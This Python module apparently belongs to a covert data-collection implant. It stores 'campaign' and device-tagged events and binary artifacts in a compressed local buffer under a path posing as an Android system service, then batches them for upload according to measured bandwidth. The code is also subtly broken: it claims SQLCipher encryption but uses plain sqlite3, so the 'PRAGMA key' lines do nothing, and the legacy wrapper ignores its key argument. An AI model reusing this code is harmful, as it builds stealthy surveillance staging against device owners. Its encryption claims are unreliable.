
"""
offline_logger.py - Advanced offline logging with encrypted SQLCipher storage
"""
import json
import os
import sqlite3
import time
import uuid
import zlib
import threading
import subprocess
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime, timedelta

from utils.crypto import encrypt, decrypt, key_from_campaign_device


@dataclass
class LogEntry:
    """Log entry data structure"""
    id: str
    timestamp: float
    event_type: str
    campaign_id: str
    device_id: str
    data: Any
    compressed_size: int
    original_size: int
    sync_status: str = "pending"
    retry_count: int = 0
    last_sync_attempt: Optional[float] = None


@dataclass
class BandwidthMetrics:
    """Bandwidth detection and metrics"""
    last_check: float
    download_speed: float
    upload_speed: float
    latency: float
    connection_type: str
    quality: str


class CircularBuffer:
    """SQLCipher-based circular buffer for log storage"""
    
    def __init__(self, db_path: Path, encryption_key: str, max_entries: int = 10000):
        self.db_path = db_path
        self.encryption_key = encryption_key
        self.max_entries = max_entries
        self._lock = threading.RLock()
        self._init_database()
    
    def _init_database(self):
        """Initialize SQLCipher database with encrypted storage"""
        try:
            with sqlite3.connect(str(self.db_path)) as conn:

                conn.execute(f"PRAGMA key = '{self.encryption_key}'")
                conn.execute("PRAGMA cipher_page_size = 4096")
                conn.execute("PRAGMA cipher_memory_security = ON")
                

                conn.executescript("""
                    CREATE TABLE IF NOT EXISTS log_entries (
                        id TEXT PRIMARY KEY,
                        timestamp REAL NOT NULL,
                        event_type TEXT NOT NULL,
                        campaign_id TEXT NOT NULL,
                        device_id TEXT NOT NULL,
                        data_compressed BLOB NOT NULL,
                        compressed_size INTEGER NOT NULL,
                        original_size INTEGER NOT NULL,
                        sync_status TEXT DEFAULT 'pending',
                        retry_count INTEGER DEFAULT 0,
                        last_sync_attempt REAL,
                        created_at REAL DEFAULT (julianday('now'))
                    );
                    
                    CREATE INDEX IF NOT EXISTS idx_timestamp ON log_entries(timestamp);
                    CREATE INDEX IF NOT EXISTS idx_sync_status ON log_entries(sync_status);
                    CREATE INDEX IF NOT EXISTS idx_created_at ON log_entries(created_at);
                    
                    CREATE TABLE IF NOT EXISTS sync_checkpoints (
                        campaign_id TEXT PRIMARY KEY,
                        last_sync_timestamp REAL NOT NULL,
                        last_sync_id TEXT,
                        total_synced INTEGER DEFAULT 0,
                        updated_at REAL DEFAULT (julianday('now'))
                    );
                    
                    CREATE TABLE IF NOT EXISTS bandwidth_metrics (
                        id INTEGER PRIMARY KEY,
                        timestamp REAL NOT NULL,
                        download_speed REAL,
                        upload_speed REAL,
                        latency REAL,
                        connection_type TEXT,
                        quality TEXT
                    );
                """)
                conn.commit()
                
        except Exception as e:
            print(f"[!] Database initialization failed: {e}")
            raise
    
    def add_entry(self, entry: LogEntry) -> bool:
        """Add log entry to circular buffer with compression"""
        try:
            with self._lock:

                data_json = json.dumps(asdict(entry))
                compressed_data = zlib.compress(data_json.encode(), level=6)
                
                entry.compressed_size = len(compressed_data)
                entry.original_size = len(data_json)
                
                with sqlite3.connect(str(self.db_path)) as conn:
                    conn.execute(f"PRAGMA key = '{self.encryption_key}'")
                    

                    conn.execute("""
                        INSERT INTO log_entries
                        (id, timestamp, event_type, campaign_id, device_id,
                         data_compressed, compressed_size, original_size, sync_status, retry_count)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """, (
                        entry.id, entry.timestamp, entry.event_type,
                        entry.campaign_id, entry.device_id, compressed_data,
                        entry.compressed_size, entry.original_size,
                        entry.sync_status, entry.retry_count
                    ))
                    

                    count = conn.execute("SELECT COUNT(*) FROM log_entries").fetchone()[0]
                    if count > self.max_entries:

                        entries_to_remove = count - int(self.max_entries * 0.9)
                        conn.execute("""
                            DELETE FROM log_entries
                            WHERE id IN (
                                SELECT id FROM log_entries
                                ORDER BY created_at ASC
                                LIMIT ?
                            )
                        """, (entries_to_remove,))
                    
                    conn.commit()
                    return True
                    
        except Exception as e:
            print(f"[!] Failed to add entry to buffer: {e}")
            return False
    
    def get_pending_entries(self, limit: int = 100) -> List[LogEntry]:
        """Get pending entries for synchronization"""
        try:
            with self._lock:
                with sqlite3.connect(str(self.db_path)) as conn:
                    conn.execute(f"PRAGMA key = '{self.encryption_key}'")
                    
                    cursor = conn.execute("""
                        SELECT id, timestamp, event_type, campaign_id, device_id,
                               data_compressed, compressed_size, original_size,
                               sync_status, retry_count, last_sync_attempt
                        FROM log_entries
                        WHERE sync_status = 'pending'
                        ORDER BY timestamp ASC
                        LIMIT ?
                    """, (limit,))
                    
                    entries = []
                    for row in cursor.fetchall():

                        compressed_data = row[5]
                        decompressed = zlib.decompress(compressed_data).decode()
                        entry_data = json.loads(decompressed)
                        
                        entry = LogEntry(
                            id=row[0],
                            timestamp=row[1],
                            event_type=row[2],
                            campaign_id=row[3],
                            device_id=row[4],
                            data=entry_data['data'],
                            compressed_size=row[6],
                            original_size=row[7],
                            sync_status=row[8],
                            retry_count=row[9],
                            last_sync_attempt=row[10]
                        )
                        entries.append(entry)
                    
                    return entries
                    
        except Exception as e:
            print(f"[!] Failed to get pending entries: {e}")
            return []
    
    def mark_synced(self, entry_ids: List[str]) -> bool:
        """Mark entries as successfully synced"""
        try:
            with self._lock:
                with sqlite3.connect(str(self.db_path)) as conn:
                    conn.execute(f"PRAGMA key = '{self.encryption_key}'")
                    
                    placeholders = ','.join('?' * len(entry_ids))
                    conn.execute(f"""
                        UPDATE log_entries
                        SET sync_status = 'synced', last_sync_attempt = ?
                        WHERE id IN ({placeholders})
                    """, [time.time()] + entry_ids)
                    
                    conn.commit()
                    return True
                    
        except Exception as e:
            print(f"[!] Failed to mark entries as synced: {e}")
            return False
    
    def update_retry_count(self, entry_id: str) -> bool:
        """Update retry count for failed sync attempts"""
        try:
            with self._lock:
                with sqlite3.connect(str(self.db_path)) as conn:
                    conn.execute(f"PRAGMA key = '{self.encryption_key}'")
                    
                    conn.execute("""
                        UPDATE log_entries
                        SET retry_count = retry_count + 1,
                            last_sync_attempt = ?,
                            sync_status = CASE
                                WHEN retry_count >= 5 THEN 'failed'
                                ELSE 'pending'
                            END
                        WHERE id = ?
                    """, (time.time(), entry_id))
                    
                    conn.commit()
                    return True
                    
        except Exception as e:
            print(f"[!] Failed to update retry count: {e}")
            return False
    
    def cleanup_synced_entries(self, older_than_hours: int = 24) -> int:
        """Clean up old synced entries"""
        try:
            with self._lock:
                cutoff_time = time.time() - (older_than_hours * 3600)
                
                with sqlite3.connect(str(self.db_path)) as conn:
                    conn.execute(f"PRAGMA key = '{self.encryption_key}'")
                    
                    cursor = conn.execute("""
                        DELETE FROM log_entries
                        WHERE sync_status = 'synced' AND timestamp < ?
                    """, (cutoff_time,))
                    
                    deleted_count = cursor.rowcount
                    conn.commit()
                    return deleted_count
                    
        except Exception as e:
            print(f"[!] Failed to cleanup synced entries: {e}")
            return 0


class BandwidthDetector:
    """Detect and monitor network bandwidth for adaptive sync"""
    
    def __init__(self, test_urls: List[str] = None):
        self.test_urls = test_urls or [
            "http://httpbin.org/bytes/1024",
            "http://httpbin.org/bytes/10240"
        ]
        self.last_metrics: Optional[BandwidthMetrics] = None
        self.cache_duration = 300
    
    def detect_bandwidth(self) -> BandwidthMetrics:
        """Detect current bandwidth and connection quality"""

        if (self.last_metrics and
            time.time() - self.last_metrics.last_check < self.cache_duration):
            return self.last_metrics
        
        try:

            download_speed = self._test_download_speed()
            

            latency = self._test_latency()
            

            connection_type = self._detect_connection_type()
            

            quality = self._determine_quality(download_speed, latency)
            
            self.last_metrics = BandwidthMetrics(
                last_check=time.time(),
                download_speed=download_speed,
                upload_speed=download_speed * 0.8,
                latency=latency,
                connection_type=connection_type,
                quality=quality
            )
            
            return self.last_metrics
            
        except Exception as e:
            print(f"[!] Bandwidth detection failed: {e}")
            return BandwidthMetrics(
                last_check=time.time(),
                download_speed=0,
                upload_speed=0,
                latency=999,
                connection_type="unknown",
                quality="offline"
            )
    
    def _test_download_speed(self) -> float:
        """Test download speed in KB/s"""
        try:
            import urllib.request
            import time
            
            url = self.test_urls[0]
            start_time = time.time()
            
            with urllib.request.urlopen(url, timeout=10) as response:
                data = response.read()
            
            elapsed = time.time() - start_time
            speed_kbps = (len(data) / 1024) / elapsed
            
            return speed_kbps
            
        except Exception:
            return 0
    
    def _test_latency(self) -> float:
        """Test network latency in milliseconds"""
        try:
            import subprocess
            import platform
            

            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', '1', '8.8.8.8']
            else:
                cmd = ['ping', '-c', '1', '8.8.8.8']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:

                if 'time=' in result.stdout:
                    time_str = result.stdout.split('time=')[1].split()[0]
                    return float(time_str.replace('ms', ''))
            
            return 999
            
        except Exception:
            return 999
    
    def _detect_connection_type(self) -> str:
        """Detect connection type (wifi/cellular)"""
        try:

            if os.path.exists('/sys/class/net/wlan0'):
                return "wifi"
            elif os.path.exists('/sys/class/net/rmnet0'):
                return "cellular"
            else:
                return "unknown"
        except Exception:
            return "unknown"
    
    def _determine_quality(self, speed_kbps: float, latency_ms: float) -> str:
        """Determine connection quality based on speed and latency"""
        if speed_kbps == 0:
            return "offline"
        elif speed_kbps > 1000 and latency_ms < 50:
            return "excellent"
        elif speed_kbps > 100 and latency_ms < 200:
            return "good"
        else:
            return "poor"


class AdvancedOfflineLogger:
    """Advanced offline logger with SQLCipher storage and adaptive sync"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.campaign_id = config.get("campaign_id", "unknown")
        self.device_id = config.get("device_id", "unknown")
        

        self.storage_path = Path(config.get(
            "storage_path",
            "/data/data/com.android.systemservice/files/offline"
        ))
        self.storage_path.mkdir(parents=True, exist_ok=True)
        

        self.encryption_key = key_from_campaign_device(
            self.campaign_id,
            self.device_id
        ).hex()
        

        db_path = self.storage_path / "offline_logs.db"
        self.circular_buffer = CircularBuffer(
            db_path,
            self.encryption_key,
            config.get("max_entries", 10000)
        )
        
        self.bandwidth_detector = BandwidthDetector()
        

        self.sync_enabled = config.get("sync_enabled", True)
        self.sync_interval = config.get("sync_interval_seconds", 300)
        
    def log_event(self, event_type: str, data: Any, priority: str = "normal") -> str:
        """Log an event with specified priority"""
        try:
            entry = LogEntry(
                id=str(uuid.uuid4()),
                timestamp=time.time(),
                event_type=event_type,
                campaign_id=self.campaign_id,
                device_id=self.device_id,
                data={
                    "payload": data,
                    "priority": priority,
                    "metadata": {
                        "user_agent": self.config.get("user_agent", "unknown"),
                        "app_version": self.config.get("app_version", "1.0.0")
                    }
                },
                compressed_size=0,
                original_size=0
            )
            
            success = self.circular_buffer.add_entry(entry)
            return entry.id if success else ""
            
        except Exception as e:
            print(f"[!] Failed to log event: {e}")
            return ""
    
    def log_artifact(self, artifact_type: str, data: bytes, metadata: Dict = None) -> str:
        """Log binary artifacts with compression"""
        try:

            compressed_data = zlib.compress(data, level=6)
            compression_ratio = len(compressed_data) / len(data) if data else 0
            
            artifact_data = {
                "compressed_data": compressed_data.hex(),
                "original_size": len(data),
                "compressed_size": len(compressed_data),
                "compression_ratio": compression_ratio,
                "metadata": metadata or {}
            }
            
            return self.log_event(f"artifact_{artifact_type}", artifact_data, "high")
            
        except Exception as e:
            print(f"[!] Failed to log artifact: {e}")
            return ""
    
    def get_sync_batch(self, bandwidth_metrics: BandwidthMetrics) -> List[LogEntry]:
        """Get batch of entries for sync based on bandwidth"""

        batch_sizes = {
            "excellent": 100,
            "good": 50,
            "poor": 10,
            "offline": 0
        }
        
        batch_size = batch_sizes.get(bandwidth_metrics.quality, 10)
        return self.circular_buffer.get_pending_entries(batch_size)
    
    def mark_entries_synced(self, entry_ids: List[str]) -> bool:
        """Mark entries as successfully synced"""
        return self.circular_buffer.mark_synced(entry_ids)
    
    def handle_sync_failure(self, entry_id: str) -> bool:
        """Handle failed sync attempts"""
        return self.circular_buffer.update_retry_count(entry_id)
    
    def cleanup_old_data(self, hours: int = 24) -> int:
        """Cleanup old synced data"""
        return self.circular_buffer.cleanup_synced_entries(hours)
    
    def get_bandwidth_metrics(self) -> BandwidthMetrics:
        """Get current bandwidth metrics"""
        return self.bandwidth_detector.detect_bandwidth()
    
    def get_storage_stats(self) -> Dict[str, Any]:
        """Get storage statistics"""
        try:
            db_size = self.circular_buffer.db_path.stat().st_size
            
            with sqlite3.connect(str(self.circular_buffer.db_path)) as conn:
                conn.execute(f"PRAGMA key = '{self.encryption_key}'")
                
                stats = conn.execute("""
                    SELECT
                        COUNT(*) as total_entries,
                        SUM(CASE WHEN sync_status = 'pending' THEN 1 ELSE 0 END) as pending_entries,
                        SUM(CASE WHEN sync_status = 'synced' THEN 1 ELSE 0 END) as synced_entries,
                        SUM(CASE WHEN sync_status = 'failed' THEN 1 ELSE 0 END) as failed_entries,
                        SUM(compressed_size) as total_compressed_size,
                        SUM(original_size) as total_original_size
                    FROM log_entries
                """).fetchone()
                
                return {
                    "database_size_bytes": db_size,
                    "total_entries": stats[0],
                    "pending_entries": stats[1],
                    "synced_entries": stats[2],
                    "failed_entries": stats[3],
                    "total_compressed_size": stats[4],
                    "total_original_size": stats[5],
                    "compression_ratio": stats[4] / stats[5] if stats[5] > 0 else 0
                }
                
        except Exception as e:
            print(f"[!] Failed to get storage stats: {e}")
            return {}



class OfflineLogger(AdvancedOfflineLogger):
    """Legacy compatibility wrapper"""
    
    def __init__(self, config: Dict[str, Any], encryption_key: bytes = None):

        if encryption_key:

            super().__init__(config)
        else:
            super().__init__(config)
